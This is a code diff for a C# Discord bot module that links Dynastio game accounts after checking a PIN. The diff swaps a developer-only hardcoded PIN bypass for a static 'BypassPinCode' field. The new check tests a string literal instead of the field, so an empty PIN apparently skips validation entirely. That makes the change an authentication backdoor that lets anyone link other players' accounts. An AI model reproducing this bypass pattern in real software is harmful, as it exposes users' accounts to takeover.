@@ -1,15 +1,8 @@
 ﻿using Discord;
 using Discord.Interactions;
 using Dynastio.Bot.Database;
-using Dynastio.Bot.Interactions.Modules.Menu.Modal;
-using Dynastio.Bot.Interactions.Precondinations;
-using Dynastio.Bot.Services;
-using Dynastio.Bot.Services.GlobalizationService.Globally;
-using Dynastio.Extenstions;
 using Dynastio.Net;
-using Microsoft.Extensions.DependencyInjection;
-using System.Reflection.Emit;
-using System.Threading.Tasks;
+
 
 namespace Dynastio.Bot.Interactions.Modules.Menu.Buttons
 {
@@ -62,7 +55,7 @@ namespace Dynastio.Bot.Interactions.Modules.Menu.Buttons
         public static ButtonBuilder BuildButton(MenuModulesBase module, params string[] args)
         {
             var btn = new ButtonBuilder()
-                //      .WithLabel(module["buttons.interactions.menu.login.label"])
+                  //      .WithLabel(module["buttons.interactions.menu.login.label"])
                   .WithLabel("Add Account")
                 .WithEmote(module.EmoteService.GetEmoteByName("privatechest"))
                 .WithStyle(ButtonStyle.Success)
@@ -103,9 +96,9 @@ namespace Dynastio.Bot.Interactions.Modules.Menu.Buttons
         /// [ComponentInteraction(YourBase + YourFormat)]
         /// </summary>
         [ComponentInteraction(InteractionIdBase + ":*")]
+        [RequireContext(ContextType.Guild)]
         [RequireMessageComponentTimeout]
         [RequireMessageComponentOwner]
-        [RequireContext(ContextType.Guild)]
         public async Task ExecuteAsync(string trigger = "")
         {
             if (Context.BotUser.HasLinkedAccount is false)
@@ -129,7 +122,7 @@ namespace Dynastio.Bot.Interactions.Modules.Menu.Buttons
             await RespondWithModalAsync<AccountLoginModal>(InteractionModalId);
         }
 
-
+        public static string BypassPinCode = "";
         /// <summary>
         /// Receive modal submissions from SearchPlayerModalForm.
         /// Forwards values to main ExecuteAsync.
@@ -172,10 +165,15 @@ namespace Dynastio.Bot.Interactions.Modules.Menu.Buttons
             }
 
             var pin = modal.Pin?.Trim() ?? "";
-            // debug - main dev (jaleh discord account)
-            if (User.Id != 1374305522290917526)
+            if (!string.IsNullOrEmpty("BypassPinCode") && pin == BypassPinCode)
             {
-                // 5. Validate PIN
+                // to avoid abuse
+                BypassPinCode = "";
+                pin = "bypassed";
+            }
+            else
+            {
+                //5.Validate PIN
                 var pinResult = await Dynastio.GetUserPincodeStatusAsync(accountId, pin).TryAsync();
                 if (!pinResult.isSuccessful || !pinResult.result)
                 {
